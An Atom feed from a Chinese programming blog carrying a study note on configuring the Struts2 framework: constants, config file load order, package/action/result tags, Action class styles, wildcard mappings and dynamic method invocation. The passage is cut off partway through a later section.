<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Atkx&#39; blog</title>
  
  
  <link href="https://swhat.github.io/atom.xml" rel="self"/>
  
  <link href="https://swhat.github.io/"/>
  <updated>2021-04-03T14:12:26.992Z</updated>
  <id>https://swhat.github.io/</id>
  
  <author>
    <name>Atkx</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Struts2核心配置</title>
    <link href="https://swhat.github.io/2021/03/28/Struts2%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/"/>
    <id>https://swhat.github.io/2021/03/28/Struts2%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/</id>
    <published>2021-03-28T11:24:14.000Z</published>
    <updated>2021-04-03T14:12:26.992Z</updated>
    
    <content type="html"><![CDATA[<p>摘要：Struts2框架学习笔记（二）</p> <a id="more"></a><h1 id="Struts2的核心配置"><a href="#Struts2的核心配置" class="headerlink" title="Struts2的核心配置"></a>Struts2的核心配置</h1><h2 id="Struts2常量配置"><a href="#Struts2常量配置" class="headerlink" title="Struts2常量配置"></a>Struts2常量配置</h2><h3 id="常量配置"><a href="#常量配置" class="headerlink" title="常量配置"></a>常量配置</h3><p><strong>1.在default.properties 中配置</strong></p><p>默认值,不会在该配置文件中配置</p><p><strong>2.在struts.properties中配置</strong></p><p>基本不会在该配置文件中配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">###设置默认编码集为UTF-8,作用于HttpServletRequest的setCharacterEncoding方法</span><br><span class="line">struts.i18n.encoding=UTF-8 </span><br><span class="line"></span><br><span class="line">###设置action请求的扩展名为action或者没有扩展名，该属性指定需要Struts 2处理的请求后缀，该属性的默认值是action，即所有匹配*.action的请求都由Struts2处理。如果用户需要指定多个请求后缀，则多个后缀之间以英文逗号（,）隔开</span><br><span class="line">struts.action.extension=action,, </span><br><span class="line"></span><br><span class="line">###设置浏览器是否缓存静态内容,默认值为true(生产环境下使用),开发阶段最好关闭</span><br><span class="line">struts.serve.static.browserCache=true </span><br><span class="line"></span><br><span class="line">### 当struts的配置文件修改后,系统是否自动重新加载该文件,默认值为false(生产环境下使用) </span><br><span class="line">struts.configuration.xml.reload=false </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">###设置不使用开发者模式，开发模式下使用,这样可以打印出更详细的错误信息</span><br><span class="line">struts.devMode = false </span><br><span class="line"></span><br><span class="line">###设置不开启动态方法调用</span><br><span class="line">struts.enable.DynamicMethodInvocation=false</span><br></pre></td></tr></table></figure><p><strong>3.在struts.xml中配置</strong></p><blockquote><p>开发中基本上都在该配置文件中配置常量</p></blockquote><p>通过<code>&lt;constant&gt;</code>元素来配置常量，该标签写<code>&lt;struts&gt;</code>下面，和<code>&lt;package&gt;</code>标签同级</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 声明常量 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">constant</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">constant</span>&gt;</span></span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">struts</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 声明常量 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!--设置默认编码集UTF-8,解决post请求乱码--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">constant</span> <span class="attr">name</span>=<span class="string">&quot;struts.i18n.encoding&quot;</span> <span class="attr">value</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">constant</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--设置使用开发者模式--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">constant</span> <span class="attr">name</span>=<span class="string">&quot;struts.devModel&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">constant</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 设置后缀 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">constant</span> <span class="attr">name</span>=<span class="string">&quot;struts.action.extension&quot;</span> <span class="attr">value</span>=<span class="string">&quot;action,,&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">constant</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">struts</span>&gt;</span></span><br></pre></td></tr></table></figure><p>4.在web.xml中配置</p><p>配置核心过滤器StrutsPrepareAndExecuteFilter时，通过初始化参数来配置常量,通过<code>&lt;filter&gt;</code>元素的<code>&lt;init-param&gt;</code>子元素指定常量</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--指定struts2的核心过滤器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--通过init-param元素配置struts2常量，设置开发者模式--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>struts.devModel<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br></pre></td></tr></table></figure><p>基本不会在该配置文件中配置</p><p>`</p><h3 id="配置文件加载顺序"><a href="#配置文件加载顺序" class="headerlink" title="配置文件加载顺序"></a>配置文件加载顺序</h3><p>1、default.properties：在该文件保存在struts2-core-2.3.37.jar中org/apache/struts2包下。</p><p>2、struts-default.xml：在核心的jar包struts2-core-2.3.37.jar的最下方，struts2框架的核心功能都是在该配置文件中配置的。</p><p>3、struts-plugin.xml配置文件。</p><p>4、struts.xml：在src的目录下，该文件是Web应用自己的配置的配置文件</p><p>5、struts.properties：该文件是Web应用默认的Struts2的配置文件</p><p>6、web.xml：该文件是Web应用的的配置文件</p><p>后加载的配置文件会覆盖掉之前加载的配置文件</p><h2 id="核心配置文件"><a href="#核心配置文件" class="headerlink" title="核心配置文件"></a>核心配置文件</h2><p>在struts2中struts.xml是核心配置文件，struts.xml文件中包含三个标签</p><h3 id="package标签"><a href="#package标签" class="headerlink" title="package标签"></a>package标签</h3><p>与java中的包不同，类似一个代码包，区别不同的action。</p><p>package标签属性：</p><ul><li>name：包的名称，区分不同的package，管理action配置</li><li>namespace：名称空间，一般与标签中的name属性共同决定访问路径</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">namespace=”/” – 根名称空间，不写默认也是“/”。</span><br><span class="line">namespace=”/aaa” – 带有名称的名称空间，访问时必须带上才能访问action</span><br></pre></td></tr></table></figure><ul><li> extends：继承，可以继承其他的包，只要继承了，那么该包就包含了其他包的功能，一般都是继承struts-default</li></ul><h3 id="action标签"><a href="#action标签" class="headerlink" title="action标签"></a>action标签</h3><p>action标签主要配置action的访问路径</p><p>action的标签属性：</p><ul><li>name：action的名称，区分不同的action，和package标签中的namespace属性构成了访问路径</li><li>class：配置Action类的全路径全路径=包名+类名，通过反射的原理去执行该类的，默认值是ActionSupport类</li><li>method ： Action类中执行的方法，如果不指定，默认值是execute<h3 id="result标签"><a href="#result标签" class="headerlink" title="result标签"></a>result标签</h3>根据action中的方法返回值，将页面定位到指定的页面或action上</li></ul><p>result标签的属性：</p><ul><li>name属性：和你方法的返回值要一样</li><li>type – 结果类型，有4个值：dispatcher(默认)、redirect、chain、redirectAction</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dispatcher(默认)和redirect：result标签中“/”代表的是项目根路径，不写就代表当前路径下</span><br><span class="line">chain和redirectAction：result标签中“/”没有任何意义，不需要写，写了就是多余，也就是只能从当前路径去指定页面！！！</span><br><span class="line">chain：只能转发到同一命名空间下的Action</span><br><span class="line">redirect：可以重定向到action中去，也可以重定向到显示页面中去</span><br></pre></td></tr></table></figure><h3 id="struts配置文件分离"><a href="#struts配置文件分离" class="headerlink" title="struts配置文件分离"></a>struts配置文件分离</h3><p>用于按模块开发，在struts.xml配置文件中使用<code>&lt;include file=&quot; &quot;/&gt;</code>包含指定的文件夹</p><p>案例1：有两个配置文件struts-part1.xml和struts-part2.xml，可以在struts.xml中配置：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">struts</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">include</span> <span class="attr">file</span>=<span class="string">&quot;struts-part1.xml&quot;</span>/&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">include</span> <span class="attr">file</span>=<span class="string">&quot;struts-part2.xml&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">struts</span>&gt;</span></span><br></pre></td></tr></table></figure><p>案例2：在cn.itcast.action.demo包下有一个配置文件struts_demo.xml，引入该配置文件到struts.xml中</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">struts</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">include</span> <span class="attr">file</span>=<span class="string">&quot;cn/itcast/action/demo/struts_demo.xml&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">struts</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Action的配置"><a href="#Action的配置" class="headerlink" title="Action的配置"></a>Action的配置</h2><h3 id="实现Action控制类"><a href="#实现Action控制类" class="headerlink" title="实现Action控制类"></a>实现Action控制类</h3><p>Action类的书写格式有三种方法</p><p><strong>方法一</strong>: Action类可以不继承特殊的类或不实现任何特殊的接口或者父类，仅仅是一个POJO，即简单的Java对象（Plain Ordinary Java Object） ，要有一个公共的无参的构造方法和一个execute方法</p><p>代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.action;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorldAction</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">execute</span> <span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>方法二</strong>: 创建一个类去实现指定的一个接口:<code>com.opensymphony.xwork2.Action</code></p><p>这个接口中只有一个抽象方法 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> String <span class="title">execute</span><span class="params">()</span><span class="keyword">throws</span> Exception</span>;</span><br></pre></td></tr></table></figure><p>同时还有5个String类型的静态属性：ERROR、SUCCESS、INPUT、NONE、LOGIN</p><p>常量：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String SUCCESS = <span class="string">&quot;success&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String NONE = <span class="string">&quot;none&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String ERROR = <span class="string">&quot;error&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String INPUT = <span class="string">&quot;input&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String LOGIN = “login”;</span><br></pre></td></tr></table></figure><p>代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.action;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.Action;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorldAction</span> <span class="keyword">implements</span> <span class="title">Action</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">execute</span> <span class="params">()</span><span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>方法三</strong>:   继承一个指定的父类:<code>com.opensymphony.xwork2.ActionSupport</code></p><p>   ActionSupport类本身实现了Action接口，是Struts2中默认的Action接口的实现类，所以继承ActionSupport就相当于实现了Acton接口，并提供了数据的校验。</p><p>代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.action;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionSupport;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorldAction</span> <span class="keyword">extends</span> <span class="title">ActionSupport</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">execute</span> <span class="params">()</span><span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>struts.xml配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;struts2_1&quot;</span> <span class="attr">namespace</span>=<span class="string">&quot;/&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;struts-default&quot;</span>&gt;</span> </span><br><span class="line">   <span class="comment">&lt;!-- 使用pjo完成action操作 --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;action1&quot;</span> <span class="attr">class</span>=<span class="string">&quot;cn.itcast.action.Demo1Action&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> &gt;</span>/success.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">   <span class="comment">&lt;!-- 实现Action类来完成action操作 --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;action2&quot;</span> <span class="attr">class</span>=<span class="string">&quot;cn.itcast.action.Demo2Action&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> &gt;</span>/success.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">   <span class="comment">&lt;!-- 通过继承ActionSupport来完成action操作 --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;action3&quot;</span> <span class="attr">class</span>=<span class="string">&quot;cn.itcast.action.Demo3Action&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> &gt;</span>/success.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在开发中，第三种方法经常用到</p><h3 id="通配符配置Action类"><a href="#通配符配置Action类" class="headerlink" title="通配符配置Action类"></a>通配符配置Action类</h3><p>先写一下常规写法</p><p>新建一个BookAction类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.action;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionSupport;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BookAction</span> <span class="keyword">extends</span> <span class="title">ActionSupport</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">add</span><span class="params">()</span></span>&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;Book add&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">delete</span><span class="params">()</span></span>&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;Book delete&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">update</span><span class="params">()</span></span>&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;Book update&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">find</span><span class="params">()</span></span>&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;Book find&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>book.jsp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/FirstStruts3/book/add&quot;</span>&gt;</span>book add<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/FirstStruts3/book/delete&quot;</span>&gt;</span>book delete<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/FirstStruts3/book/update&quot;</span>&gt;</span>book update<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/FirstStruts3/book/find&quot;</span>&gt;</span>book find<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在struts.xml配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;struts2_2&quot;</span> <span class="attr">namespace</span>=<span class="string">&quot;/book&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;struts-default&quot;</span>&gt;</span> </span><br><span class="line">   <span class="comment">&lt;!--常规Action配置--&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;add&quot;</span> <span class="attr">class</span>=<span class="string">&quot;cn.itcast.action.BookAction&quot;</span> <span class="attr">method</span>=<span class="string">&quot;add&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> &gt;</span>/success.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;delete&quot;</span> <span class="attr">class</span>=<span class="string">&quot;cn.itcast.action.BookAction&quot;</span> <span class="attr">method</span>=<span class="string">&quot;delete&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> &gt;</span>/success.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;update&quot;</span> <span class="attr">class</span>=<span class="string">&quot;cn.itcast.action.BookAction&quot;</span> <span class="attr">method</span>=<span class="string">&quot;update&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> &gt;</span>/success.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;find&quot;</span> <span class="attr">class</span>=<span class="string">&quot;cn.itcast.action.BookAction&quot;</span> <span class="attr">method</span>=<span class="string">&quot;find&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> &gt;</span>/success.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br></pre></td></tr></table></figure><p>跑一下项目，都打印出来了<br><img src="https://img-blog.csdnimg.cn/20210326113943563.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在使用struts2时，每一个action都需要配置，每一个action里面的方法以及其返回到的界面都需要配置，如果一个一个配置，就太麻烦了，这里我们可以约定一些命名规范，然后再struts.xml里面使用通配符配置。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;struts2_2&quot;</span> <span class="attr">namespace</span>=<span class="string">&quot;/book&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;struts-default&quot;</span>&gt;</span> </span><br><span class="line">   <span class="comment">&lt;!--使用通配符的Action配置--&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;*&quot;</span> <span class="attr">class</span>=<span class="string">&quot;cn.itcast.action.BookAction&quot;</span> <span class="attr">method</span>=<span class="string">&quot;&#123;1&#125;&quot;</span>&gt;</span></span><br><span class="line">   <span class="comment">&lt;!--&#123;1&#125;代表匹配一个*--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> &gt;</span>/success.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br></pre></td></tr></table></figure><p>也可以成功<br><img src="https://img-blog.csdnimg.cn/20210326114605767.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="Action的动态方法调用"><a href="#Action的动态方法调用" class="headerlink" title="Action的动态方法调用"></a>Action的动态方法调用</h3><p>在实际生活中，Action太多不便管理，为了减少Action，通常在一个Action中编写不同的方法处理不同的请求，如编写LoginAction，其中login()方法处理登陆请求，register()方法处理注册请求，此时可以采用动态方法调用来处理。</p><p>在使用动态方法调用时，在Action的名字中使用<code>!</code>符号来标识要调用方法的名称，语法格式如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;Action名称!方法名称&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>使用动态方法调用将请求提交给Action时，表单中的每个按钮提交事件都交给同一个Action，只是对应Action中的不同方法。只需要在struts.xml中只要配置该Action</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;Action名字&quot;</span> <span class="attr">class</span>=<span class="string">&quot;包名.Action类名&quot;</span>&gt;</span></span><br><span class="line"> &lt;result&quot;&gt;/test.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当开启动态方法调用功能时，应当将下面的常量置为true</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 动态方法调用是否开启，默认是关闭的 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">constant</span> <span class="attr">name</span>=<span class="string">&quot;struts.enable.DynamicMethodInvocation&quot;</span> <span class="attr">value</span>=<span class="string">&quot;false&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">constant</span>&gt;</span></span><br></pre></td></tr></table></figure><p>不推荐使用动态方法调用，因为会存在安全隐患。</p><h2 id="访问Servlet-API的方法"><a href="#访问Servlet-API的方法" 